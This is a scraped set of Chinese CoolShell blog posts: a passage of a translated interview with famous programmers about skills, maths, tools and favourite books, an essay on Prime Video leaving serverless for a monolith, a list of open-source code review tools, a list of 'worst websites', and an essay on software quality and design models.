Hansson_**很强的对有价值的事的感觉。你可以问问自己这个问题你有没有这种能力：我现在做的这个事值不值得做？很多程序员浪费了如大海一样的时间去做一些无意义的事。
**_Peter Norvig_**我不觉得只有一个，如果要我说一个的话，我说是“专注”。**_Dave Thomas_**热情。**_Guido Van Rossum_**你的问题很难回答啊:-) 我猜，如果程序员会在早晨煎个鸡蛋做早餐，那真是无价的能力。**_James Gosling_**自我激发。你需要全身心地投入到你要做的事中。**_Bjarne Stroustrup_**把事想清楚的能力：程序必需要能清楚地理解问题并能清楚地表述解决方案。**_Tim Bray_**能为自己的直觉提供证据的能力。#### Q 3: 你是否认为数学和/或物理是一种很重要的编程技能？为什么？**_Steve Yegge_**数学有很多的分支和程序员相关，他们是“离散数学”和“具体数学”。这些分支包括的学科有，概率论，组合数学，图论，归纳证明，和其它有用的东西。我会鼓励所有的程序员都去学习离散数学，无论能学多少，因为这总比什么都不懂强。对于传统的数学，我也不经常用，但是我需要的时候这些数学知识会很管用。例如，在我之前的工作中我就用到了微积分。我需要估计每个小时中某服务的高峰时间的流量负载，所以，他的负载是跟着太阳走的就像一个正弦曲线一样。最简单的方式就是把每个小时的负载曲线给整合起来。如果我不知道微积分，我就不知道怎么更为准确地估计。
当年我在开发我的Wyvern游戏的时候，我的平面几何的知识对我非常有帮助。而且经常使用代数和线性代数的知识。但我很少在工作中使用三角学或微分方程，微积分同样也很少。我想说，简单的数学基础让我的技能比一般程序员好过5%到10%。如果我了解更多的数学，我确信我会比今天做得更好，所以，我每周都会花几个小时学习数学。我喜欢物理，我还在学习物理，我会花我一生去理解量子力学。但是我个却没有发现物理对我的程序员工作有多有用。当然，如果我从事一些和物理相关的工作，可能会有用，例如：3D游戏编程，或是某种物理特性仿真。**_Linus Torvalds_**我个人认为有很强的数学背景是一件好事。但我不确信物理是不是这样的，但是我深信懂数学的人会让你成为一个更好的程序员。这些智力模型都是相通的。**_David Heinemeier Hansson_**根本没用。至少对业务编程和Web应用来说没用。但是数学可能对一个人的写作有很重要的帮助。**_Peter Norvig_**是的。很多相法都是从数学来的：归纳，递归，逻辑，等等。**_Dave Thomas_**也许吧。但老实说，我没见到过懂这些学科和好的程序员有很大的相关性。
然而，我见过有音乐背景和好的编程技能有很强的相关性。我不知道这为什么，但是我怀疑大脑中的某个区域可以让人即可以写出好的音乐，也可以写出好的代码。（陈皓注： _@Sir阿怪 _貌似就是这个例子）**_Guido Van Rossum_**数学，当然（对于一些学科是很重要的，我不关心微分方程，但是代数和逻辑学是很重要的），物理，我不觉得对编程技能有关，当然物理在其它很多地方很有意思。**_James Gosling_**当然！数学教会了我逻辑和推导……让我有了一双懂分析的眼睛。当我们分析算法的时候，数学是无法被取代的。**_Bjarne Stroustrup_**这要看程序员自己和项目性质了。以前的数学很有用，物理一般，但是学好物理是是学习应用数学最好的一条路。**_Tim Bray_**对我来说，在我的编程生涯中我从来都没有用过大学里教的数学。#### Q 4: 关于编程，你们认为接下来的大事是什么？X-Oriented编程，Y语言，量子电脑 ？**_Steve Yegge_**我认为Web编程会逐渐变成最最重要的客户端编程。而对于原来传统的客端端编程都会被废弃，如： GTK, Java Swing/SWT, Qt, 当然，所有的和平台有关的东西，例如 Cocoa 和 Win32/MFC/等。
当然，这不会一晚上就发生了。这会在第一个十年内缓慢地发生，而在第二个十年内，Web Apps最终会胜利。工具，语言，协议，和浏览器技术都会进步得非常快，并会完全超出你今天能干的事。每一年都会向前进一步，而从今天开始，我会最终决定把我所有的应用开发全部切换到基于浏览器的应用。（陈皓注：我也是这么认为的，参看《来信，创业，移动互联网》）微软和苹果最终不愿意这个事发生，所以，触发这个事的第一步会是一个开源的浏览器（如：Firefox）开始到了支配市场的地位，然后会出现某种Firefox的杀手级应用（这种杀手级应用可能会像iTunes一样，所有的人都会用它，只需要下载Firefox）**_Linus Torvalds_**我并不认为我们会看到一个“大的跳跃”。我们只会看到很多的工作帮助我们把那些沉闷辛苦的工作变得更简单——会有一个更高级别的语言，也许把简单的数据库集成到语言中来会是其中最主要一个。例如，我个人相信“Visual Basic”在编程方面比“面向对象”做得更多。当然，人们都在取笑VB是一个很烂的编程语言，并且人们在谈论OO语言都十多年了。但我还觉得不是这样的，Visual Basic 不是一个好的语言，但是我觉得VB那简单的数据库接口比OO更重要。
所以，我认为会语言有很多的改进，并且，硬件的改进会让编程更容易，但我并不期望会有巨大的生产力或是革命性的改进。至少，你不会开始搞真正的AI的东西，我也不认为真的AI会变成某种你不需要编程的东西。**_David Heinemeier Hansson_**我从不试图预测未来。我也不相信命运一说。最好预测未来的方式就是去实现未来。**_Peter Norvig_**大规模的分布式处理**_Dave Thomas_**下一个最牛的事会被再下一个最牛的事所掩盖，然后再被再再下一个所掩盖，再再再下一个所掩盖……。这是一件没完没了的事，所以，我并不会试图去找最牛的事，因为这会让人们忘了那些最真实的问题：把基本的东西做对。我们要让用户更满意，专注于交付有价值的东西，自豪于我们做的事。一个程序员可以使用很多工具把这些事做得更好，而不是去追逐时尚和流行。**_Guido Van Rossum_**对不起，我没有那么多水晶球。我CGI被发明了5年后预测过它 :-)**_James Gosling_**有两个事是我现在最关心的，那就是要对付并行和复杂。**_Bjarne Stroustrup_**我不知道，我也不愿猜。
**_Tim Bray_**不知道。#### Q 5: 如果你有3个月学一个相对较新的技术，你会学什么？**_Steve Yegge_**我的确有3个月的业余时间，我准备学一下 Dojo () 和高级 AJAX 及 DHTML。我会通过开发一个相当牛的Web应用来学习他们。Dojo 真的酷，并且我确信它会越来越好。**_Linus Torvalds_**嗯，我真的很爱做 FPGA（可编程芯片），但我部是太忙了而不是坐来来开始学习。我喜爱和硬件打交道：很明显这个原因是因为我最终在做操作系统，因为操作系统（除了编译器）基本上都是在和硬件打交道，但我没有真正地自己去设计和做一个硬件。**_David Heinemeier Hansson_**Mac 的 Cocoa 编程**_Peter Norvig_**我想把 Javascript 学得更好， ~~然也~~ 当然也想学 flash.**_Dave Thomas_**如果“新”是对于我来说，那么我会去学钢琴课。如果“新”是说技术，我猜 我会选择学习某种和为残疾人服务的有关的技术。**_Guido Van Rossum_**单板滑雪。**_James Gosling_**
搞点有乐趣的东西，我会学习最新的3D渲染技术。我可能会写一个光子映射渲染器。**_Bjarne Stroustrup_**3个月只有很少的东西你可以学，我觉得你只能参加某个成熟领域的培训。**_Tim Bray_**安全，加密，数字签名，身份标识，等等。对我来说，从没学过这些东西对我来说是个很大的问题。#### Q 6: 你们觉得如何让一些程序员可能有超过其它程序员10倍或100倍的生产力？**_Steve Yegge_**我想你应该考虑一下为什么不是让所有的程序员都一样牛。托马斯爱迪生有一句关于天才的名言也许会给你一些启示。**_Linus Torvalds_**我真的不知道，我想，一些人之所以更牛是因为他们可以专注于那些重要的事，而更多的只不过是在应付。那些我所知道的真的很牛的程序员从很年轻的时候就在做事了。**_David Heinemeier Hansson_**把难题变简单的能力。**_Peter Norvig_**把整体问题一次性放入大脑的能力。**_Dave Thomas_**他们关心他们做的事。**_Guido Van Rossum_**大脑结构基因不同。**_James Gosling_**
他们知道他们要做什么，他们不并不急于仓促行事。他们有他们要做的事的整个蓝图。**_Bjarne Stroustrup_**首先，缺少足够的职业培训，或基础不够。其次，这些人要即聪明（那种可以把事情想清楚，直达核心的能力），又有经验，并有使用工具的知识。编程需要把理论和实践结合起来 – 并不是使用没有实际业务的知识。**_Tim Bray_**令人惊讶的思维改变。#### Q 7: 什么工具是你的最爱（操作系统，编程/脚本语言，文本编辑器，版本管理，shell，数据库，或其它没它你活不了的工具），为什么不是别的？**_Steve Yegge_**操作系统： Unix! 我用Linux，cygwin，和 darwin。你无法打败那些高效的工具。每一个程序员都应该学习使用/bin和/usr/bin下的所有命令。脚本语言：Ruby。我几乎对所有的重要的脚本语言都很熟悉： Perl, Python, Tcl, Lua, Awk, Bash, 和一些我忘了的。但是我太懒了，而Ruby是目前所有脚本语言中最简单的，它应该是天堂制造的。编程语言：没有一个我喜欢的，我觉得所有的编程语言都很扯。我倾向于Java，因为它很强，可跨平台，有多不错的工具和类库。但是Java未来会进化或是灭亡，Java还没有好到可以永远保持其领先地位。
文本编辑器：Emacs，因为这是迄今最好的编辑器。版本管理：SVN，Perforce更好一些，但是也很贵。Shell脚本： Bash, 因为我太懒了去学一个更好的。数据库： 当然是MySQL，没有之一。其它：我发现GIMP是无价的，但也是令人恼 ~~炎~~ 火的。我用这个东西好几年了，但什么也没干，但是我没它活不了。很讽刺吧。Firefox 越来越是我最重要的工具。如果让我去用IE和Safari，我会有严重的窒息感。注：所有的这些工具 (Unix, Emacs, Firefox, GIMP, MySQL, Bash, SVN, Perforce) 都有一个共同点：他们是可扩展的。例如：他们都有可编程的API。伟大的程序员知道怎么编写他们的工具，而不只是去使用。**_Linus Torvalds_**实际上，我最终也没有用过几个工具，而我却花了一些时间让这些工具为我工作。最大的事是我自己写了个操作系统，我也自己写了个版本管理系统（git），我用的文本编辑器是 micro-emacs – 最终我也定制和扩展了它。除了上面三个，其它的东西，我深度关心我的邮件阅读软件，我使用“pine”，并不是因为它是史上最好的邮件阅读软件，因为我习惯了，用它我会有最低限度的大惊小怪。
**_David Heinemeier Hansson_**OS X, TextMate, Ruby, Subversion, MySQL. 这些组合让我很快乐。我希望那些有好的品味的专注于重要的事的工具。**_Peter Norvig_**我不喜欢那三大操作系统 – Windows, Mac, Linux。我喜欢 Python 和 Lisp. Emacs.**_Dave Thomas_**在使用Linux10年后我转到Mac平台有两年多了。Mac并不见得有多好，但是它不需要很牛的技术，也不需要经常维护，这让我可以让我更专心得使用它。我并不是一个单一工具的信仰者，我喜欢换来换去的，这样可以让我有更多的经历。现在，我使用 OSX, Emacs, TextMate, Rails, Ruby, SVN, CVS, Rake, make, xsltproc, TeX, MySQL, Postgres, 还有一堆高效的小工具。没人知道我明年会用什么。**_Guido Van Rossum_**Unix/Linux, Python, vi+emacs, Firefox.**_James Gosling_**
这些天，我在用 NetBeans. 用它可以干我想干的所有的事，清洁，简单和高效。这是最好的我永远要生活在其中的环境了。**_Bjarne Stroustrup_**Unix, sam (一个非常简单的文本编辑器), 当然，一个好的C++编译器。**_Tim Bray_**我喜欢 Unix-like 的操作系统，像 Python 和 Ruby 的动态语言，像Java的静态语言（具体说来是Java API） Emacs, 还有, bash, whatever, NetBeans.#### Q 8: 你最喜欢的编程书是什么？**_Steve Yegge_**大哥，这个问题太难了。也许是”Gödel, Escher, Bach: an Eternal Golden Braid” (作者Hofstadter)？虽然这不是严格意义上的编程的书，如果你要明确意义上的编程书，那么可能是 SICP (mitpress.mit.edu).**_Linus Torvalds_**嗨。这两天我在读一些小说，或是非计算机读物（老的但是有用的 “The Selfish Gene” 作者 Richard Dawkins)。
如果要问我编程的书，我脑子里只出现了唯 一一本真正的经典的编程的书 Kernighan & Ritchie 的 “The C Programming Language”，因为这本书太牛了，可读性强并且很短。考 ~~虚~~ 虑一下你想学到这世上一门最重要编程语言，并且它很要很薄，而且还有可读性，这真是一个奇迹。也就是说，其它我很喜欢的书并不是编程的，而是关于计算机结构和硬件的。那显然是 Patterson & Hennessy 的计算机结构的书，但是我个人也许更喜欢 Crawford & Gelsinger 的 “Programming the 80386?，这是我在开始写Linux时用的书。相似的原因，我还喜欢 Andrew Tanenbaum 的 “Operating Systems: Design and Implementation”.**_David Heinemeier Hansson_**我喜欢 Extreme Programming Explained 其摒弃了一般的编程实践，我还喜欢 Patterns of Enterprise Application Architecture 其出众地说明了抽象和具现的平衡。
**_Peter Norvig_**Structure and Interpretation of Computer Programs**_Dave Thomas_**这关系到你所谓的“最喜欢”，也许我最喜欢的是IBM的 “IBM/360 Principles of Operation.”**_Guido Van Rossum_**Neil Stephenson的 Quicksilver.**_James Gosling_**Programming Pearls 作者Jon Bentley._**Bjarne Stroustrup**_K&R.**_Tim Bray_**Bentley的 Programming Pearls#### Q 9: 你最喜欢的和编程无关的一本书是什么？**_Steve Yegge_**只能是一本吗？这不可能。有太多太多我喜欢的书了。我这个月读过最喜欢的书是 “Stardust” (Neil Gaiman) 和 “The Mind’s I” (Hofstadter/Dennet).我最喜欢的作者是 Kurt Vonnegut, Jr. 和 Jack Vance.
**_Linus Torvalds_**我在前面说过 Dawkins的 Selfish Gene。在小说方面，有很多很多我enjoy的，但是几乎没有我特别喜欢的一本。我一般不会重读一本书，我的选择总是会变。我可能更喜欢科幻小说，如：”Stranger in a Strange Land” 作者 Heinlein，这是我青少年时期最喜欢的书，但现在并不是我喜欢的了。**_David Heinemeier Hansson_**1984, George Orwell.**_Guido Van Rossum_**Neil Stephenson 的 Quicksilver.**_James Gosling_**Guns, Germs & Steel 作者 Jared Diamond**_Bjarne Stroustrup_**我没有固定喜欢的书。目前是 O’Brian 的 Aubrey/Maturin 系列。**_Tim Bray_**One Day in the Life of Ivan Denisovich#### Q 10: 你最喜欢的乐队/演奏家/作曲家？**_Steve Yegge_**
喜欢的风格：古典音乐，动漫原声音乐，电脑游戏音乐喜欢的作曲家：Rachmaninoff, Chopin, Bach喜欢的演奏者：David Russell (古典吉它), Sviatoslav Richter (钢琴)喜欢的动漫音乐： Last Exile, Haibane Renmei**_Linus Torvalds_**实际上我并不太喜欢音乐，但是当我听音乐的时候，我一般听经典摇滚乐，如： Pink Floyd ，Beatles ，Queen 和 The Who 乐队。**_David Heinemeier Hansson_**我喜欢很多风格。 Beth Orton, Aimee Mann, Jewel, Lauryn Hill. Actually, 所有的这些都可以归到 Girls with Guitars ;).**_Guido Van Rossum_**Philip Glass.**_James Gosling_**我喜欢听民歌: Christine Lavin, Woody Guthrie, Pete Seeger…**_Bjarne Stroustrup_**乐队: The Dixie Chicks. 作曲家: Beethoven.
**_Tim Bray_**看我的博客吧。. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .#### **补充说明**我之所以发现这篇文章，是因为我读到了 Jeff Atwood 的这篇名为 “Linus Torvalds, Visual Basic Fan” 的文章，这篇文章指向了 “STIFF ASKS, GREAT PROGRAMMERS ANSWER” 这篇文章，但是链接已坏了，然后，我搜了一下也没有搜到这篇文章。然后我去了 archive.org 搜了一下，并找到了这篇由 Jaroslaw Rzeszótko 写的博客。因为这篇博文现在找不到了，所以，我想我应该重新把它贴出来，这样其它人可以读一下这篇有意思的文章。所以，我向原作者取得了授权，再次感谢 Jaroslaw!
（全文完）# 是微服务架构不香还是云不香？作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn这两天技术圈里热议的一件事就是Amazon的流媒体平台Prime Video在2023年3月22日发布了一篇技术博客《规模化Prime Video的音视频监控服务，成本降低90%》，副标题：“ **从分布式微服务架构到单体应用程序的转变有助于实现更高的规模、弹性和降低成本** ”，有人把这篇文章在五一期间转到了reddit 和 hacker news 上，在Reddit上热议。这种话题与业内推崇的微服务架构形成了鲜明的对比。从“微服务架构”转“单体架构”，还是Amazon干的，这个话题足够劲爆。然后DHH在刚喷完Typescript后继续发文《即便是亚马逊也无法理解Servless或微服务》，继续抨击微服务架构，于是，瞬间引爆技术圈，登上技术圈热搜。今天上午有好几个朋友在微信里转了三篇文章给我，如下所示：* 《微服务是不是个蠢主意？》   * 《单体回归？亚马逊放弃用于视频监控的微服务 》   * 《从微服务转为单体架构、成本降低 90%，亚马逊内部案例引发轰动》
看看这些标题就知道这些文章要的是流量而不是好好写篇文章。看到第二篇，你还真当 Prime Video 就是 Amazon 的全部么？然后，再看看这些文章后面的跟风评论，我觉得有 80%的人只看标题，而且是连原文都不看的。所以，我想我得写篇文章了……#### 原文解读要认清这个问题首先是要认认真真读一读原文，Amazon Prime Video 技术团队的这篇文章并不难读，也没有太多的技术细节，但核心意思如下：1） **这个系统是一个监控系统，用于监控数据千条用户的点播视频流** 。主要是监控整个视频流运作的质量和效果（比如：视频损坏或是音频不同步等问题），这个监控主要是处理视频帧，所以，他们有一个微服务主要是用来把视频拆分成帧，并临时存在 S3 上，就是下图中的 Media Conversion 服务。2） **为了快速搭建系统，Prime Video团队使用了Serverless 架构，也就是著名的 AWS Lambda 和 AWS Step Functions** 。前置 Lambda 用来做用户请求的网关，Step Function 用来做监控（探测器），有问题后，就发 SNS 上，Step Function 从 S3 获取 Media Conversion 的数据，然后把运行结果再汇总给一个后置的 Lambda ，并存在 S3 上。
整个架构看上去非常简单 ，一点也不复杂，而且使用了 Serverless 的架构，一点服务器的影子都看不见。 **实话实说，这样的开发不香吗？我觉得很香啊，方便快捷，完全不理那些无聊的基础设施，直接把代码转成服务，然后用 AWS 的 Lamda + Step Function + SNS + S3 分分钟就搭出一个有模有样的监控系统了，哪里不好了？！**但是他们遇到了一个比较大的问题，就是 AWS Step Function 的伸缩问题，从文章中我看到了两个问题（注意前方高能）：1. 需要很多很多的并发的 AWS Step Function ，于是达到了帐户的 hard limit。   2. AWS Step Function 按状态转换收费，所以，贵得受不了了。注意，这里有两个关键点：1） **帐户对 Step Function 有限制** ，2） **Step Function 太贵了用不起** 。然后，Prime Video 的团队开始解决问题，下面是解决的手段：1） 把 Media Conversion 和 Step Function 全部写在一个程序里，Media Conversion 跟 Step Function 里的东西通过内存通信，不再走S3了。结果汇总到一个线程中，然后写到 S3.
2）把上面这个单体架构进行分布式部署，还是用之前的 AWS Lambda 来做入门调度。EC2 的水平扩展没有限制，而且你想买多少 CPU/MEM 的机器由你说了算，而这些视频转码，监控分析的功能感觉就不复杂，本来就应该写在一起，这么做不更香吗？当然更香，比前面的 Serverless 的确更香，因为如下的几个原因：1. 不再受 Step Function 的限制了，技术在自己手里，有更大的自由度。   2. 没有昂贵的 Step Function 云成本的确变得更低了，如果你把 Lambda 换成 Nginx 或 Spring Gateway 或是我司的 Easegress，你把 S3 换成 MinIO，你把 SNS 换成 Kafka，你的成本 还能再低。#### 独立思考好了，原文解读完了，你有自己的独立思考了吗？下面是我的独立思考，供你参考：1） **AWS 的 Serverless 也好， 微服务也好，单体也好，在合适的场景也都很香** 。这就跟汽车一样，跑车，货车，越野车各有各的场景，你用跑车拉货，还是用货车泡妞都不是一个很好的决定。2） **这篇文章中的这个例子中的业务太过简单了，本来就是一两个服务就可以干完的事。** 就是一个转码加分析的事，要分开的话，就两个微服务就好了（一个转码一个分析），做成流式的。如果不想分，合在一起也没问题了，这个粒度是微服务没毛病。微服务的划分有好些原则，我这里只罗列几个比较重要的原则：
* **边界上下文** 。微服务的粒度不能大于领域驱动里的 Bounded Context（具体是什么 大家自行 Google），也就是一个业务域。   * **单一职责，高内聚，低耦合** 。把因为相同原因变化的合在一起（内聚），把不同原因变化的分开（解耦）   * **事务和一致性** 。对于两个重度依赖的功能，需要完成一个事务和要保证强一致性的，最好不要拆开，要放在一起。   * **跟组织架构匹配** 。把同一个团队的东西放在一起，不同团队的分开。3） **Prime Video 遇到的问题不是技术问题，而是 AWS Step Function 处理能力不足，而且收费还很贵的问题** 。这个是 AWS 的产品问题，不是技术问题。或者说，这个是Prime Video滥用了Step Function的问题（本来这种大量的数据分析处理就不适合Step Function）。所以，大家不要用一个产品问题来得到微服务架构有问题的结论，这个没有因果关系。 **试问，如果 Step Funciton 可以无限扩展，性能也很好，而且白菜价，那么 Prime Video 团队还会有动力改成单体吗？他们不会反过来吹爆 Serverless 吗？**
4）Prime Video 跟 AWS 是两个独立核算的公司，就像 Amazon 的电商和 AWS 一样，也是两个公司。Amazon 的电商和 AWS 对服务化或是微服务架构的理解和运维，我个人认为这个世界上再也找不到另外一家公司了，包括 Google 或 Microsoft。你有空可以看看本站以前的这篇文章《Steve Yegg对Amazon和Google平台的吐槽》你会了解的更多。5） **Prime Video 这个案例本质上是“下云”，下了 AWS Serverless 的云** 。云上的成本就是高，一个是费用问题，另一个是被锁定的问题。Prime Video 团队应该很庆幸这个监控系统并不复杂，重写起来也很快，所以，可以很快使用一个更传统的“服务化”+“云计算”的分布式架构，不然，就得像 DHH 那样咬牙下云——《Why We’re Leaving the Cloud》（他们的 SRE 的这篇博文 Our Cloud Spend in 2022说明了下云的困难和节约了多少成本）#### 后记最后让我做个我自己的广告。我在过去几年的创业中，帮助了很多公司解决了这些 分布式，微服务，云原生以及云计算成本的问题，如果你也有类似问题。欢迎，跟我联系：[[email protected]](/cdn-cgi/l/email- protection#87efe6e8e2ebc7efe8f3eae6eeeba9e4e8ea)
另外，我们今年发布了一个平台 MegaEase Cloud， **就是想让用户在不失去云计算体验的同时，通过自建高可用基础架构的方式来获得更低的成本（至少降 50%的云计算成本）。** 目前可以降低成本的方式：1. 基础软件：通过开源软件自建，   2. 内容分发：MinIO + Cloudflare 的免费 CDN，   3. 马上准备发布的直接与底层IDC合作的廉价GPU计算资源…**欢迎大家试用。****如何访问*** 中国区: https://cloud.megaease.cn    * 国际区：**注：这两个区完全独立，帐号不互通。因为网络的不可抗力，千万不要跨区使用。****产品演示*****介绍文章*** 欢迎使用 MegaEase Cloud    * 2023 年 03 月重大更新（全文完）# 简单实用的Code Review工具作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cnCode Review中文应该译作“代码审查”或是“代码评审”，这是一个流程，当开发人员写好代码后，需要让别人来review一下他的代码，这是一种有效发现BUG的方法。由此，我们可以审查代码的风格、逻辑、思路……，找出问题，以及改进代码。因为这是代码刚刚出炉的时候，所以，这也是代码重构，代码调整，代码修改的最佳时候。所以，Code Review是编码实现中最最重要的一个环节。
长时间以来，Code Review需要有一些有效的工具来支持，这样我们就可以更容易，更有效率地来进行代码审查工作。下面是5个开源的代码审查工具，他们可以帮助你更容易地进行这项活动。**1.Review board:**   Review board 是一个 基于web 的工具，是由 django 和python设计的。 Review board 可以帮助我们追踪待决代码的改动，并可以让Code-Review更为容易和简练。尽管Review board 最初被设计在VMware项目中使用，但现在其足够地通用。当前，其支持这些代码版本管理软件： SVN, CVS, Perforce, Git, Bazaar, 和Mercurial.Yahoo 是review-board的其中一个用户。“Review board 已经改变了代码评审的方式，其可以强迫高质量的代码标准和风格，并可以成为程序员编程的指导者。每一次，当你访问search.yahoo.com 时，其代码都是使用 Review board工具Review过的。 We’re great fans of your work!” – Yahoo! Web Search
### !Detailed review requests!Powerful diff viewer**2.Codestriker:**   Codestriker 也是一个基于Web的应用，其主要使用 GCI-Perl 脚本支持在线的代码审查。Codestriker 可以集成于CVS, Subversion, ClearCase, Perforce 和Visual SourceSafe。并有一些插件可以提供支持其它的源码管理工具。David Sitsky 是 Codestriker 的作者，并也是最活跃的开发人员之一。 Jason Remillard 是另一个活路的开发者，并给这个项目提供了最深远最有意义的贡献。大量的程序员贡献他们的代码给 Codestriker 项目，导致了这个项目空前的繁荣。!http://codestriker.sourceforge.net/viewtopicdetail.png**3.Groogle:**   Groogle 是一个基于WEB的代码评审工具。 Groogle 支持和 Subversion 集成。它主要提供如下的功能：* 各式各样语言的语法高亮。   * 支持整个版本树的比较。   * 支持当个文件不同版本的diff功能，并有一个图形的版本树。   * 邮件通知所有的Reivew的人当前的状态。   * 认证机制。
!Screenshot**4.Rietveld:**   Rietveld 由Guido van Rossum 开发（他是Python的创造者，现在是Google的员工），这个工具是基于Mondrian 工具，作者一开始是为了Google 开发的，并且，它在很多方面和Review board 很像。它也是一个基于Web的应用，并在Google App Engine 上。它使用了目前最流行的Web开发框架 django 并支持 Subversion 。当前，任何一个使用 Google Code 的项目都可以使用 Rietveld 并且使用 python Subversion 服务器。当然，它同样支持其它的Subversion服务器。)**5. JCR**   JCR 或者叫做 JCodeReview 也是一个基于WEB界面的最初设计给Reivew Java 语言的一个工具。当然，现在，它可以被用于其它的非Java的代码。JCR 主要想协助：* **审查者** 。所有的代码更改都会被高亮，以及大多数语言的语法高亮。Code extracts 可以显示代码评审意见。如果你正在Review Java的代码，你可以点击代码中的类名来查看相关的类的声明。   * **项目所有者** 。可以 轻松创建并配置需要Review的项目，并不需要集成任何的软件配置管理系统（SCM）。   * **流程信仰者** 。 所有的评语都会被记录在数据库中，并且会有状态报告，以及各种各样的统计。   * **架构师和开发者** 。 这个系统也可以让我们查看属于单个文件的评语，这样有利于我们重构代码。
JCR 主要面对的是大型的项目，或是非常正式的代码评审，从这方面看来，他并不像上面的那些工具。!Screenshot**Jupiter** ：最后我们要提一下Jupiter，这是另一个代码review的工具你可以去考虑使用的，它是一个Eclipse IDE 的插件。文章：来源# 史上最糟糕的网站作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn下面罗列了一些可能是史上最糟糕的网站，当你打开这些网站的时候，请不要太过惊讶，你可以尝试着欣赏一下，不可否认，如果你使劲全力去欣赏，你还是可以找到一些亮点的。呵呵。1. ，这个网站让我想到了我97年在大学里开始学习HTML的时光，该网页的风格可能比当时我做的还要好一些，不过基本上是很类似的。   2. ，这个网站呢？先介绍这个网站主要是让你对后面的网站有个过渡，老实说，这个网站比起后面的来说，还算可以了。这个网站教会我们如何分类网页上的信息   3. ，这个网站教你如何在固定空间的网页上放置更多的信息。这好像是我们日常生活当中经常出现的问题，如何把更多的东西放进一个固定的箱子里，我们不停地调整着物品摆放的位置和顺序……   4. ，开始了，这个网站教会我们如何把图片无序地组织起来。   5. ，嗯，初看起来吓一大跳，这个网页教你如何制作一个惊悚的网页，不过往细里看，看久一会，你会发现，这个网页设计得很的印象派的风格，也许是一种艺术。   6. ，什么叫炫，这就叫炫，太炫了，眼睛就炫花了。打开这个网页的时候，要注意浏览器上边的提示条，耶稣真的很强大啊。   7. ，打开这个网页要小心啊，因为这个网页可能比BT下载还猛，据说可能会占用你半GB的带宽。小心啊。   8. ，这可能是史上最无厘头的网页了，不知道这个网站要干什么，找到可以点的地方点吧，打开一个网页，再点击其中的链接，又打开一个网页，不一会儿你就会在一层又一层的网页中迷路了，好在每次打开的网页都风格迥然，倒也不会觉得单一。
你还知道一些BT的网站吗？欢迎和我们一样分享。# “品质在于构建过程”吗？作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**感谢@weidagang （Todd）向酷壳投递的这篇精彩的文章。原文**今天在微博上看到几位敏捷爱好者探讨敏捷测试和质量保证问题，我忍不住也加入了讨论：> **Z先生原帖：** 我刚才看到一个大会演讲稿，谈到敏捷测试六大指导原则：1.仅靠测试人员不可能获得高质量的软件，质量是整个研发团队的责任；2. > 场景是不可穷举的，测试活动必须是风险驱动的，关注于高风险的场景；3.分层自动化测试是唯一出路;4.在正确的位置进行恰当的测试是自动化的关键；【待续】 > > **S先生回复：** 品质在于构建过程。检验贯穿构建过程，提供及时反馈。 > > **我回复：** 什么样的构建过程才能出Unix这样的品质呢？迭代？快速反馈？TDD? > > **S先生回复：** 据说stroustrup听到重构时的反应是，我们从七十年代就这样做了。推荐《UNIX编程环境》，了解大师的编程方式。 > > **我回复：** 您偷换了概念。不能说大师用了重构，C++和UNIX的品质就是靠重构或某种构建过程得来的。厨师做菜用到了勺子，不等于菜好吃是因为勺子。 > > **S先生回复：** 我没有概念。我们看到一个果，就问因是什么。其实是泛因果，无因果，一切是机缘凑巧。 > > **我回复：** “品质在于构建过程”难道不是一个明白的因果描述吗？ > > **S先生回复：** 品质在于构建的人。我说话时没因果，你看到了因果。 > > **我回复：** 欢迎敏捷爱好者围观！
很高兴几个回合讨论下来S先生修正了先前“品质在于构建过程”的观点。什么重构、TDD、迭代、快速反馈等等构建过程都不是Unix品质的核心要素。我不但不认同“品质在于构建过程”、“测试是最好的设计方法”这类机械式的观点，而且也不满意把软件优劣归结于“人是根本”的简单回答。我们需要探索一个既非机械式，也非简单地归结为某种理念的答案。像Unix这样优秀的软件，真正的核心要素到底是什么呢？我的答案是：模型，即人心中的软件。在看得见、摸得着之前，Unix的品质就已经存在于设计者的心中了，他们不会在Unix诞生后惊讶：“哇，Unix的稳定性这么好，7×24小时运行，从来不蓝屏”。模型一定是设计者心中最美的东西，为什么我们阅读操作系统源代码会像进入迷宫一般理不清头绪，而作者自己却觉得头头是道呢？因为作者早已“胸有成竹”，我们以为他几十万行代码敲很辛苦，实际上在他自己看来是按部就班一步步向目标靠近。模型是软件的灵魂，存在于设计者的心中，而软件的构建过程正是心中的世界向现实世界逐渐投影。模型可以是完美的，而现实却非完美，或许有时候我们很幸运地到达了，或许有时候我们不得不向现实妥协，改变心中的世界。试图制造灯泡的爱迪生可能会一时找不到熔点极高的发光金属而止步不前，企图制造永动机的人则根本无法实现。在不完美的现实中，我们明明想的是a+b，却敲成了a-b；我们以为某个API可以很快返回，没想到却等了5秒钟，为了不阻塞用户不得不改成了异步。Review、测试等构建过程在一定程度上弥补了现实的不完美，并对模型给予了反馈，但它却无法决定软件的特质。如果设计者心中没有Unix，即使每个实现环节都层层检验，拥有光速般的反馈，他有怎么能构建出Unix呢？Windows NT内核和Windows 3.1内核的品质差别不在于微软采用了两种不同的构建过程，而在于它们采用了不同的内核模型。灵魂与躯体的差别就在于此！虽然对于普通的软件开发通常有不少成熟的模型供选择，并不需要总是创造自己的模型，但理解模型间的差异，并在设计时选用恰当的模型仍然比采用某种构建过程更加重要。服务器架构采用Nginx似的异步IO模型，还是采用Apache似的每个请求一个线程的模型远比开发是否采用了TDD更为重要。
